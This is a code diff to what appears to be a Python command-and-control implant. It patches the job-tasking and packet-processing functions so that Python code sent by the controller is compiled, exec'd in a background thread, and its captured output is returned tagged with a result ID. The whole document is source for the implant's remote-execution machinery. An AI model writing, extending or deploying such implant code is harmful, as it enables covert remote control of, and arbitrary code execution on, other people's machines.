@@ -238,8 +238,10 @@ def process_job_tasking(result):
     #  - returns to the C2
     # execute/process the packets and get any response
     try:
-        resultPackets = ""
+        resultPackets = b""
         if result:
+            if isinstance(result, str):
+                result = result.encode('UTF-8')
             resultPackets += result
         # send packets
         send_message(resultPackets)
@@ -479,8 +481,7 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))
 
     elif packetType == 110:
-        start_job(data)
-        send_message(build_response_packet(110, "job %s started" % (len(jobs) - 1), resultID))
+        start_job(data, resultID)
 
     elif packetType == 111:
         # TASK_CMD_JOB_SAVE
@@ -843,11 +844,11 @@ class KThread(threading.Thread):
         self.killed = True
 
 
-def start_job(code):
+def start_job(code, resultID):
     global jobs
 
     # create a new code block with a defined method name
-    codeBlock = "def method():\n" + indent(code)
+    codeBlock = "def method():\n" + indent(code[1:])
 
     # register the code block
     code_obj = compile(codeBlock, '<string>', 'exec')
@@ -855,28 +856,29 @@ def start_job(code):
     # not the locals() scope
     exec(code_obj, globals())
 
-    # create/processPacketstart/return the thread
-    # call the job_func so sys data can be cpatured
-    codeThread = KThread(target=job_func)
+    # create/process Packet start/return the thread
+    # call the job_func so sys data can be captured
+    codeThread = KThread(target=job_func, args=(resultID,))
     codeThread.start()
 
     jobs.append(codeThread)
 
 
-def job_func():
+def job_func(resultID):
     try:
-        old_stdout = sys.stdout
-        sys.stdout = mystdout = StringIO()
+        buffer = StringIO()
+        sys.stdout = buffer
         # now call the function required
         # and capture the output via sys
         method()
-        sys.stdout = old_stdout
-        dataStats_2 = mystdout.getvalue()
-        result = build_response_packet(110, str(dataStats_2))
+        #sys.stdout = old_stdout
+        sys.stdout = sys.__stdout__
+        dataStats_2 = buffer.getvalue()
+        result = build_response_packet(110, str(dataStats_2), resultID)
         process_job_tasking(result)
     except Exception as e:
         p = "error executing specified Python job data: " + str(e)
-        result = build_response_packet(0, p)
+        result = build_response_packet(0, p, resultID)
         process_job_tasking(result)
 
 
